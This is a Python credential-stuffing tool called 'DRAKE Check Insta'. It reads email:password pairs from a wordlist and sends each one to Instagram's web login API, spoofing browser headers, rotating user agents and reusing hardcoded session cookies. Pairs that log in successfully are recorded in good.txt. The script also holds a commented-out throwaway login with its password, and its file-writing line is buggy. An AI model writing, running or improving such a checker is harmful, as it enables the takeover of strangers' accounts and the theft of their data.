from os import system as sy
try:
    import requests
    import time,random,argparse
    from user_agent import generate_user_agent
except ImportError:
    sy('pip install requests user_agent')
    import requests
    import time,random,argparse
    from user_agent import generate_user_agent

Z = '\033[1;31m'
F = '\033[2;32m'
###########################

des = argparse.ArgumentParser(description='Drake is a tool for checking Instagram accounts.')
des.add_argument('-w','--wordlist',required=True,help='wordlist')
args = des.parse_args()
######################
dragon = Z+r"""
                       __====-_     _-====__                       
                 _--^^^#####//       \\#####^^^--_                 
              _-^##########// (    )  \\##########^-_              
             -############//  |\^^/|   \\############-             
           _/############//   (@::@)    \\############\_           
          /#############((     \\//      ))#############\         
         -###############\\    (oo)     //###############-        
        -#################\\  / '' \   //#################-       
       -###################\\//    \\//###################-      
      _#/|##########/\######(        )######/\##########|\#_     
      |/ |#/\#/\#/\/  \#/\##\        /##/\#/  \/\#/\#/\#| \|     
      |/  V  V  V    V  V  V          V  V  V    V  V  V  \|   
                         DRAKE Check Insta
                            SilentEcho  
"""
print(dragon,F)
##login('pemaba7089@citdaca.com','mazouz123')
cookies = {
    'csrftoken': 'WMlAljLygCDuLtJJqqUP8O',
    'datr': 'UeKMZ3VTPf1G0TIIegFRKFgd',
    'ig_did': '9BAB6E14-4131-498B-9DCE-6C00DB258CB4',
    'ps_l': '1',
    'ps_n': '1',
    'mid': 'Z4ziUQALAAFhh_0nOZmw9vUcW84y',
    'wd': '578x607',
}
def us_agent():
    us = generate_user_agent()
    return us
headers = {
    'accept': '*/*',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,ar;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.instagram.com',
    'priority': 'u=1, i',
    'referer': 'https://www.instagram.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.205", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Windows"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': us_agent(),
    'x-asbd-id': '129477',
    'x-csrftoken': 'WMlAljLygCDuLtJJqqUP8O',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': '0',
    'x-instagram-ajax': '1019437627',
    'x-requested-with': 'XMLHttpRequest',
    'x-web-device-id': '9BAB6E14-4131-498B-9DCE-6C00DB258CB4',
    'x-web-session-id': 'kfmubn:p2igyn:2uyyun',
}
#############################################
file = args.wordlist
file = open(file,'r')
#############################################

def login(user,password):
    headers['user-agent']=us_agent()
    data = {
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
        'caaF2DebugGroup': '0',
        'loginAttemptSubmissionCount': '0',
        'optIntoOneTap': 'false',
        'queryParams': '{}',
        'trustedDeviceRecords': '{}',
        'username': user,
    }

    response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',cookies=cookies ,headers=headers, data=data).text
    if '"authenticated":true' in response:
        print(f'good : {user} | {password}')
        open('good.txt','a').write(user,':',password)
    elif '"authenticated":false' in response:
        print(f'BAD :{user}|{password}',end='\r')
    else:
        print(response)
for g in file:
    email,pw = g.split(':',1)
    login(email,pw)